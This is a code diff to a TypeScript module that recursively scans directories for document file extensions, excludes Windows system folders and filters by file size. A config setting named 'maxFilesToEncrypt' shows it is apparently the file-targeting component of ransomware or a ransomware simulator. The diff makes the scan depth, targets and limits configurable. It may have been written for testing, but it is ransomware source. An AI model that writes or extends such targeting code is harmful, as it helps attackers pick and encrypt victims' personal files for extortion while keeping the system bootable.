@@ -1,8 +1,14 @@
 import fs from 'fs'
 import path from 'path'
+import { loadConfig } from './config'
+
+// Get configuration
+const config = loadConfig()
 
 // File extensions to target
-const TARGET_EXTENSIONS = [
+const TARGET_EXTENSIONS = config.targetExtensions.length > 0 
+    ? config.targetExtensions 
+    : [
     // Documents
     '.doc',
     '.docx',
@@ -56,7 +62,9 @@ const TARGET_EXTENSIONS = [
 ]
 
 // Directories to exclude
-const EXCLUDED_DIRS = [
+const EXCLUDED_DIRS = config.excludedDirectories.length > 0
+    ? config.excludedDirectories
+    : [
     'Windows',
     'Program Files',
     'Program Files (x86)',
@@ -70,7 +78,7 @@ const EXCLUDED_DIRS = [
 // Recursively scan a directory for target files
 export function scanDirectory(
     directory: string,
-    maxDepth: number = 3,
+    maxDepth: number = config.maxScanDepth,
     currentDepth: number = 0
 ): string[] {
     // Limit scan depth for safety and performance
@@ -87,6 +95,11 @@ export function scanDirectory(
 
             // Skip excluded directories
             if (EXCLUDED_DIRS.some((dir) => item.includes(dir))) {
+                continue
+            }
+
+            // Skip hidden files if configured to do so
+            if (config.skipHiddenFiles && item.startsWith('.')) {
                 continue
             }
 
@@ -124,7 +137,7 @@ export function scanDirectory(
 // Function to check if a file is smaller than a certain size
 export function isFileSmallerThan(
     filePath: string,
-    maxSizeMB: number
+    maxSizeMB: number = config.maxTargetFileSizeMB
 ): boolean {
     try {
         const stats = fs.statSync(filePath)
@@ -139,11 +152,11 @@ export function isFileSmallerThan(
 // Function to get a subset of files for testing
 export function getTestTargetFiles(
     targetDirectory: string,
-    maxFiles: number = 5,
-    maxSizeMB: number = 10
+    maxFiles: number = config.maxFilesToEncrypt,
+    maxSizeMB: number = config.maxTargetFileSizeMB
 ): string[] {
     // Scan the target directory for files
-    const allFiles = scanDirectory(targetDirectory, 2)
+    const allFiles = scanDirectory(targetDirectory, config.maxScanDepth)
 
     // Filter out files that are too large
     const sizeFilteredFiles = allFiles.filter((file) =>
